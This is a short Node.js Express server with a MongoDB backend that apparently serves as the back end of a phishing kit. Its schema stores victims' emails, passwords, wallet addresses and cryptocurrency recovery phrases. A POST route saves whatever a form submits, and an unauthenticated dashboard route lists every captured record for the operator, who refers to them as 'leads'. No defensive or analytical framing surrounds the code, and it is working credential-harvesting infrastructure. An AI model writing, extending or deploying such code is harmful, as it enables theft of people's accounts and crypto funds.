const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.json());
app.use(express.static('public'));

// 1. Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("Mongo connection error:", err));

// 2. Define how the data is structured
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema);

// 3. Route to capture and save info
app.post('/update', async (req, res) => {
    try {
        const newLead = new Lead(req.body);
        await newLead.save();
        res.status(200).send("Information saved.");
    } catch (err) {
        console.error(err);
        res.status(500).send("Error saving info.");
    }
});

// 4. Route for your dashboard to show the info
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        res.status(500).send("Error loading leads.");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
